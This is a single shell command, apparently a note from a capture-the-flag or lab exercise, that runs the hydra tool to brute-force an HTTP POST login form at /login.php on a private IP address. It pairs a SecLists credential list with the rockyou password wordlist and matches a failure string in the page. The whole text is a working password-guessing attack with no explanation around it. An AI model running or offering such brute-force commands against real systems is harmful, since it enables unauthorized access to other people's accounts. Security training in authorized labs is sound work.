```

sudo hydra -L /usr/share/seclists/Passwords/UserPassCombo-Jay.txt -P /usr/share/wordlists/rockyou.txt -u  10.10.153.202 -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<div class='login-container'" 

```
